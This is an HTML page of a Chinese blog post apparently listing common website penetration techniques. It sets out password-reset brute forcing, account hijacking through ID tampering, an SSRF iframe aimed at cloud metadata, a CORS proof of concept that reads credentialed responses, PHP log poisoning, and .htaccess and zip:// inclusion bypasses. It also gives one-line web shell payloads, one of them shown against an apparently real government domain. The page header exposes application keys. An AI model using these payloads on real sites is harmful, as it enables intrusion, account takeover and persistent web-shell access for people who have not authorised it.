@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="zh_CN">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="常用网站渗透思路"/><link rel="alternate" href="/atom.xml" title="Saltneko"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="http://yoursite.com/2020/02/04/常用网站渗透思路/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":"app_id:sB2SP6AaImiT4x3A8ms2stxj-gzGzoHsz app_key:69kbIXu3HeNAasY9m6mbX6fa","toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>常用网站渗透思路 - Saltneko</title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Saltneko</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/archives/">
+        <li class="mobile-menu-item">Archives
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories
+          </li>
+      </a><a href="/link/">
+        <li class="mobile-menu-item">Link
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Saltneko</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            Archives
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            Categories
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/link/">
+            Link
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">常用网站渗透思路
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2020-02-04
+        </span><span class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#防撞库"><span class="toc-text">#防撞库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入"><span class="toc-text">#SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#万能密码"><span class="toc-text">#万能密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#短信轰炸"><span class="toc-text">#短信轰炸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#明文传输（抓包看post）"><span class="toc-text">#明文传输（抓包看post）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲打XSS"><span class="toc-text">#盲打XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查找上传（申请友链，头像，敏感页面等）"><span class="toc-text">#查找上传（申请友链，头像，敏感页面等）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查找编辑器"><span class="toc-text">#查找编辑器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查找phpmyadmin等管理程序尝试弱口令登陆"><span class="toc-text">#查找phpmyadmin等管理程序尝试弱口令登陆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#移动端密码重置"><span class="toc-text">#移动端密码重置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#越权漏洞"><span class="toc-text">#越权漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过密码确认限制"><span class="toc-text">#绕过密码确认限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存在允许将信息导出为PDF的功能（大部分为HTML转PDF），在源信息中输入一些HTML代码之后，就能让目标应用在服务端执行相应的HTML代码"><span class="toc-text">#存在允许将信息导出为PDF的功能（大部分为HTML转PDF），在源信息中输入一些HTML代码之后，就能让目标应用在服务端执行相应的HTML代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#COSR（跨站资源共享策略配置不当）未设置访问源白名单并具备规则"><span class="toc-text">#COSR（跨站资源共享策略配置不当）未设置访问源白名单并具备规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP文件包含"><span class="toc-text">#PHP文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志（具有读权限）"><span class="toc-text">#日志（具有读权限）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#会话文件"><span class="toc-text">#会话文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-访问URL通过post提交PHP代码并执行"><span class="toc-text">#php..// 访问URL通过post提交PHP代码并执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#htaccess文件突破黑名单（上传格式限制）"><span class="toc-text">#.htaccess文件突破黑名单（上传格式限制）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php流封装绕过截断"><span class="toc-text">#php流封装绕过截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通用防注入系统getshell"><span class="toc-text">#通用防注入系统getshell</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h3 id="防撞库"><a href="#防撞库" class="headerlink" title="#防撞库"></a>#防撞库</h3><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="#SQL注入"></a>#SQL注入</h3><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="#万能密码"></a>#万能密码</h3><h3 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="#短信轰炸"></a>#短信轰炸</h3><h3 id="明文传输（抓包看post）"><a href="#明文传输（抓包看post）" class="headerlink" title="#明文传输（抓包看post）"></a>#明文传输（抓包看post）</h3><h3 id="盲打XSS"><a href="#盲打XSS" class="headerlink" title="#盲打XSS"></a>#盲打XSS</h3><h3 id="查找上传（申请友链，头像，敏感页面等）"><a href="#查找上传（申请友链，头像，敏感页面等）" class="headerlink" title="#查找上传（申请友链，头像，敏感页面等）"></a>#查找上传（申请友链，头像，敏感页面等）</h3><h3 id="查找编辑器"><a href="#查找编辑器" class="headerlink" title="#查找编辑器"></a>#查找编辑器</h3><h3 id="查找phpmyadmin等管理程序尝试弱口令登陆"><a href="#查找phpmyadmin等管理程序尝试弱口令登陆" class="headerlink" title="#查找phpmyadmin等管理程序尝试弱口令登陆"></a>#查找phpmyadmin等管理程序尝试弱口令登陆</h3><a id="more"></a>
+<h3 id="移动端密码重置"><a href="#移动端密码重置" class="headerlink" title="#移动端密码重置"></a>#移动端密码重置</h3><p>1.输入手机号发送重置密码请求，收到4/6位验证码，尝试暴力破解（存在频率限制，但不会对请求执行黑名单化行为）<br>2.在竞态条件之下，使用多个IP地址向Instagram后端发送多个密码重置的确认码并发请求</p>
+<h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="#越权漏洞"></a>#越权漏洞</h3><p>1.直接在用户名后尝试不同的用户ID越权登陆（登陆/创建联系人/添加用户等功能）<br>2.a)创建账号前抓包，传入未注册邮箱信息看Response（可能返回auth_token值）； b)根据post得知获取用户信息的路径； c)在 burpsuite的代理历史中查看有哪些请求用到了auth_token； d)浏览器隐身模式登陆对应URL（成功登陆劫持）；</p>
+<h3 id="绕过密码确认限制"><a href="#绕过密码确认限制" class="headerlink" title="#绕过密码确认限制"></a>#绕过密码确认限制</h3><p>1.未设置验证的情况下，发送修改密码申请并抓包修改目标用户邮箱为自己的邮箱，成功修改用户密码并登陆<br>2.通过测试账号找到注册邮箱更改路径，抓包根据具体的post内容修改用户邮箱为自己的邮箱</p>
+<h3 id="存在允许将信息导出为PDF的功能（大部分为HTML转PDF），在源信息中输入一些HTML代码之后，就能让目标应用在服务端执行相应的HTML代码"><a href="#存在允许将信息导出为PDF的功能（大部分为HTML转PDF），在源信息中输入一些HTML代码之后，就能让目标应用在服务端执行相应的HTML代码" class="headerlink" title="#存在允许将信息导出为PDF的功能（大部分为HTML转PDF），在源信息中输入一些HTML代码之后，就能让目标应用在服务端执行相应的HTML代码"></a>#存在允许将信息导出为PDF的功能（大部分为HTML转PDF），在源信息中输入一些HTML代码之后，就能让目标应用在服务端执行相应的HTML代码</h3><p>例：通过请求AWS元数据服务查看敏感信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://169.254.169.254/latest/meta-data&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="COSR（跨站资源共享策略配置不当）未设置访问源白名单并具备规则"><a href="#COSR（跨站资源共享策略配置不当）未设置访问源白名单并具备规则" class="headerlink" title="#COSR（跨站资源共享策略配置不当）未设置访问源白名单并具备规则"></a>#COSR（跨站资源共享策略配置不当）未设置访问源白名单并具备规则</h3><p><code>Access-Control-Allow-Credentials: true</code><br>概念验证代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">     &lt;body&gt;</span><br><span class="line"></span><br><span class="line">         &lt;h2&gt;CORS PoC&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">         &lt;div id=&quot;demo&quot;&gt;</span><br><span class="line"></span><br><span class="line">             &lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">         &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">         &lt;script&gt;</span><br><span class="line"></span><br><span class="line">             function cors() &#123;</span><br><span class="line"></span><br><span class="line">             var xhr = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">             xhr.onreadystatechange = function() &#123;</span><br><span class="line"></span><br><span class="line">                 if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line"></span><br><span class="line">                 document.getElementById(&quot;demo&quot;).innerHTML = alert(this.responseText);</span><br><span class="line"></span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">             &#125;;</span><br><span class="line"></span><br><span class="line">              xhr.open(&quot;GET&quot;,</span><br><span class="line"></span><br><span class="line">                       &quot;https://api.company.com/endpoint&quot;, true);</span><br><span class="line"></span><br><span class="line">             xhr.withCredentials = true;</span><br><span class="line"></span><br><span class="line">             xhr.send();</span><br><span class="line"></span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">         &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">     &lt;/body&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="#PHP文件包含"></a>#PHP文件包含</h3><h3 id="日志（具有读权限）"><a href="#日志（具有读权限）" class="headerlink" title="#日志（具有读权限）"></a>#日志（具有读权限）</h3><p>1.查找日志文件存放位置：<br>1）利用文件包含漏洞去读取apache日志默认在/etc/httpd/logs/access_log<br>2）找apache配置文件，通过任意文件读取漏洞配置文件找到日志路径/etc/httpd/conf/httpd.conf<br>1.插入PHP代码：<br>1）使用burpsuit抓包访问，绕过浏览器编码&lt;&gt;<br>2）curl访问不存在的url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.192.1/a.php?=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="会话文件"><a href="#会话文件" class="headerlink" title="#会话文件"></a>#会话文件</h3><h3 id="php-访问URL通过post提交PHP代码并执行"><a href="#php-访问URL通过post提交PHP代码并执行" class="headerlink" title="#php..// 访问URL通过post提交PHP代码并执行"></a>#<code>php..//</code> 访问URL通过post提交PHP代码并执行</h3><p>例：写入一句话木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fwrite(fopen(&quot;xxx.php&quot;,&quot;w&quot;),&apos;&lt;?php eval($_POST[&quot;cc&quot;]);?&gt;&apos;);?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="htaccess文件突破黑名单（上传格式限制）"><a href="#htaccess文件突破黑名单（上传格式限制）" class="headerlink" title="#.htaccess文件突破黑名单（上传格式限制）"></a>#.htaccess文件突破黑名单（上传格式限制）</h3><p>1.自定义.htaccess上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch “test.jpg”&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>2.同目录下上传保存为jpg格式的一句话，成功绕过限制</p>
+<h3 id="php流封装绕过截断"><a href="#php流封装绕过截断" class="headerlink" title="#php流封装绕过截断"></a>#php流封装绕过截断</h3><p>例：设文件包含代码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a = $_GET[&apos;file&apos;]; </span><br><span class="line">include $a.&apos;.html.php&apos;;</span><br></pre></td></tr></table></figure>
+<p>％00无法截断，只能包含xxxx.html.php<br>1.新建一个hello.html.php，内容为<code>phpinfo（）;</code><br>2.压缩成zip<br>3.访问网址[<a href="http://localhost/test/blog.php?file=zip://test.zip%23hello],成功包含压缩文件内的`hello.html.php`" target="_blank" rel="noopener">http://localhost/test/blog.php?file=zip://test.zip%23hello],成功包含压缩文件内的`hello.html.php`</a></p>
+<h3 id="通用防注入系统getshell"><a href="#通用防注入系统getshell" class="headerlink" title="#通用防注入系统getshell"></a>#通用防注入系统getshell</h3><p>1.网站的目录存在sqlin.asp保存注入记录 可以写入一句话木马<br>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pzzl.gov.cn/sqlin.asp?id=1 and 1=&lt;%eval request(&quot;salt&quot;)%&gt;</span><br></pre></td></tr></table></figure>
+<p>2.若失败，则对一句话木马进行简单加密，用菜刀进行连接</p>
+
+      </div>
+      
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="prev" href="/2020/02/04/SQL%E6%B3%A8%E5%85%A5/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">SQL注入</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    <a class="next" href="/2020/02/04/Discuz-ML-3-x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+        <span class="next-text nav-default">Discuz!ML 3.x任意代码执行漏洞</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div>
+  <div class="comments" id="comments">
+    
+  </div>
+</div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:1281714262@qq.com" target="_blank" rel="noopener" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/SaLTNEko" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2015 - 2020<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Salt</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
